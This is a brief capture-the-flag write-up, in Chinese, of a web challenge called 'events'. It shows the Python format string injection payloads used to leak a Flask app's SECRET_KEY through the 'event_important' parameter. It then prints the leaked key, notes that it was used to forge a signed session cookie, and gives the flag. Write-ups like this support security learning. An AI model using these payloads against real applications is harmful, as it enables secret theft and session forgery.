# events

這題其實一開始我們方向全錯

一直往cookie去踹

但後來我從`asd:asd`這個帳號發現有人成功利用 python format string 漏洞撈到東西

才開始踹 format string

然後發現漏洞在: `event_name=a&event_address=a&event_important=__dict__`

而 config 在: `event_name=a&event_address=a&event_important=__class__.__init__.__globals__[app].config`

會噴 `SECRET_KEY`: `fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y`

用這把 key 去簽 cookie 就行了

`fb{e@t_aLL_th0s3_c0oKie5}`